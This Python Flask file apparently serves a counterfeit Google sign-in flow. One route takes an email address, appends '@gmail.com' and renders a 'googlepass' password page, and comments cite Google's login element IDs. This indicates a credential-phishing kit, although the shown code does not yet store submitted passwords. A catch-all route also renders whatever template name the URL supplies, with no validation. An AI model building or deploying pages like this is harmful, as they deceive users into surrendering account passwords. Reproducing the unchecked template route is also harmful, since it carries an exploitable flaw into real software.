from flask import Flask, render_template, request,session
import sqlite3
import re

app=Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route("/googlepass/<mail>")
def glogin(mail):
    if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
    return render_template('googlepass.html',act=mail)

@app.route("/<name>",methods=['GET','POST'])
def login(name):
    return render_template(f'{name}.html')


# google account show profileIdentifier

# google next identifierNext


if __name__=="__main__":
    app.run()